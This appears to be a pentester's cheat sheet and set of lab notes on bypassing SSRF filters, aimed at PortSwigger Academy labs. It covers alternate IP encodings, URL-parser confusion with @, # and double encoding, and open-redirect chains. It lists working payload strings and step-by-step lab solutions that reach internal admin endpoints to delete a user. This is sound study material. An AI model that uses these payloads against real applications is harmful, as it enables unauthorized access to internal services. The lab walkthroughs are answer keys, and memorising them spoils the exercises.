# SSRF — Filter bypass (blacklist, whitelist, open redirection)

Apps that "fix" SSRF with input filters are usually bypassable. Three families: defeat **blacklists** (alternate IP encodings, obfuscation), defeat **whitelists** (URL-parser confusion with `@`/`#`/encoding), and chain an **open redirect** on an allowed domain. Outcome: full SSRF despite the filter — High–Critical.

## Quick reference

```
# blacklist bypass (127.0.0.1 / localhost blocked)
http://127.1/                 http://2130706433/        http://017700000001/   # decimal/octal
http://[::1]/                 http://0/                 http://127.0.0.1.nip.io/
spoofed.burpcollaborator.net  # a domain that resolves to 127.0.0.1
# blocked path /admin -> double-URL-encode a char:  /%2561dmin   (a = %61 -> %2561)
# whitelist bypass (URL-parser inconsistencies)
http://expected-host@evil-host           # credentials before host -> real host = evil-host
http://evil-host#expected-host           # fragment
http://expected-host.evil-host           # DNS hierarchy (you own evil-host)
http://localhost:80%2523@expected-host/admin/...   # %2523 = double-encoded #
# open-redirect chain (only ALLOWED domain accepted, but it has an open redirect)
stockApi=https://ALLOWED/product/nextProduct?path=http://192.168.0.12:8080/admin
```
Decision list: blocked literal `127.0.0.1`/`/admin` → alt IP rep + encode the path. Whitelist parses & checks hostname → confuse the parser (`@`,`#`,double-encode). Only one domain allowed but it redirects → open-redirect chain.

## Root cause
The validation code and the HTTP-request code parse the URL **differently** (or the blacklist is incomplete). Any representation that the filter reads as "safe" but the fetcher resolves to the target is a bypass. Open redirect: the filter only checks the first hop, not where it lands.

## Technique
**Blacklist bypass:**
- **Alternate IP representations of 127.0.0.1:** decimal `2130706433`, octal `017700000001`, short `127.1`, IPv6 `[::1]`/`[::ffff:127.0.0.1]`, `0`/`0.0.0.0`.
- **Attacker domain → 127.0.0.1:** register one (lab: `spoofed.burpcollaborator.net`), or use `127.0.0.1.nip.io`.
- **Obfuscate blocked strings:** URL-encode / double-URL-encode (`/admin` → `/%2561dmin` once the literal `/admin` is blocked), case variation.
- **Redirect:** point at a URL you control that 301/302s to the target; vary redirect code and switch `http`→`https` (some filters only check the initial scheme).

**Whitelist bypass (URL-parser confusion):**
- **Embedded credentials:** `https://expected-host@evil-host` — everything before `@` is userinfo, so the real host is `evil-host`.
- **Fragment:** `https://evil-host#expected-host`.
- **DNS hierarchy:** `https://expected-host.evil-host` (you control `evil-host`).
- **Encoding discrepancies:** URL-encode / double-encode characters the validator and fetcher decode differently — e.g. `localhost:80%2523@stock.weliketoshop.net/admin` (`%2523` decodes to `%23` = `#`), so the validator sees host `stock...` (passes) but the fetcher connects to `localhost`.
- Combine techniques.

**Open-redirect chain:** the allowed domain has an open redirect (`/nextProduct?path=...` reflected into `Location`). Supply `stockApi=https://ALLOWED/nextProduct?path=http://internal/admin` — the filter passes (allowed domain), the fetcher follows the redirect to the internal target. Requires the HTTP client to follow redirects.

## Payload arsenal
```
# blacklist
http://127.1/admin            http://2130706433/admin
http://127.0.0.1/%2561dmin    http://localhost%00.evil.com/admin
http://spoofed.burpcollaborator.net/admin
# whitelist
http://username@stock.weliketoshop.net/
http://stock.weliketoshop.net#@evil/
http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
# open redirect
/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos   (as stockApi value on ALLOWED host)
```

## Bypasses
| Filter | Bypass |
|---|---|
| blocks `127.0.0.1`/`localhost` | `127.1`, decimal/octal/IPv6, attacker domain → 127.0.0.1 |
| blocks `/admin` path | double-URL-encode a char (`/%2561dmin`) |
| whitelist on hostname | `@` credentials, `#` fragment, `host.evil`, double-encoded `#` (`%2523`) |
| only ALLOWED domain | open-redirect chain on that domain |
| filter checks scheme only | switch `http`→`https` during redirect |

## Exploitation walkthrough (whitelist bypass)
1. `stockApi=http://127.0.0.1/` rejected → app extracts & whitelists the hostname.
2. `http://username@stock.weliketoshop.net/` accepted ⇒ parser honors embedded creds.
3. Append `#` → rejected; **double-encode** it: `http://localhost:80%2523@stock.weliketoshop.net/` → "Internal Server Error" (it tried to connect to `localhost`).
4. Target it: `http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos` → solved.

## Chaining
- → [Access-control](../../Access-control/) (internal admin), [Authentication](../../Authentication/).
- Open-redirect chain overlaps OAuth `redirect_uri` theft and the open-redirect class generally.

## Tools
- **Burp Repeater** (iterate encodings), **Burp Intruder** (fuzz IP reps / encodings), **Collaborator** (`spoofed.burpcollaborator.net`).

## Labs

### SSRF with blacklist-based input filter [Practitioner]
URL: /web-security/ssrf/lab-ssrf-with-blacklist-filter
- `http://127.0.0.1/` blocked → `http://127.1/`; `/admin` blocked → double-encode `a` to `%2561` (`/%2561dmin`) → admin → delete carlos. Insight: alt IP rep + path obfuscation defeat blacklists.

### SSRF with filter bypass via open redirection [Practitioner]
URL: /web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection
- Direct host change blocked; `next product` puts `path` into `Location` (open redirect). `stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`. Insight: filter checks the first hop, not the redirect target.

### SSRF with whitelist-based input filter [Expert]
URL: /web-security/ssrf/lab-ssrf-with-whitelist-filter
- Parser honors `user@host`; double-encode `#` (`%2523`): `http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos`. Insight: validator vs fetcher parse the URL differently.

Real-target transfer: when an SSRF param is filtered, ladder through alt IP encodings → parser-confusion (`@`/`#`/double-encode) → open-redirect chain.

## Real-world notes
- URL-parser confusion is a deep, productive real-world area (see "A New Era of SSRF" / Orange Tsai); the same payloads bypass CORS/open-redirect filters too.
- Always test double-encoding — recursive URL-decoders are common.

## References
- https://portswigger.net/web-security/ssrf (Circumventing common SSRF defenses)
- https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
